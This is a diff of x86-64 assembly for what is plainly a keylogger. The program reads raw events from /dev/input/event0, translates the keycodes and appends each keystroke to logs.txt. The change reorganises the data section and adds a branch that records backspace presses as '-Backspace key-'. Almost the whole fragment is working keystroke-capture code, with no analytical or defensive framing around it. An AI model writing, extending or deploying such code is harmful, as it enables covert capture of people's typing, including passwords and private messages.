@@ -181,10 +181,11 @@ keys:
     .org keys+57
     .byte 0x20
 
+file: .string "/dev/input/event0"
+logs: .string "logs.txt"
+backspacePressed: .string "-Backspace key-"
 .section .data
-    file: .string "/dev/input/event0"
-    logs: .string "logs.txt"
-    test: .string "HHH"
+
     buffer: .skip 256, 0
 
 .section .text
@@ -240,7 +241,8 @@ main:
         movzbq (%rsi), %rsi
         addq $keys, %rsi
 
-        
+        cmpb $0x8, (%rsi)
+        je BackspaceKey
 
         # write in the logs file
         movq $1, %rax
@@ -248,6 +250,14 @@ main:
         movq $1, %rdx
         syscall
 
+        jmp mainLoop
+
+    BackspaceKey:
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $backspacePressed, %rsi
+        movq $15, %rdx
+        syscall
         jmp mainLoop
 
     popq %r14
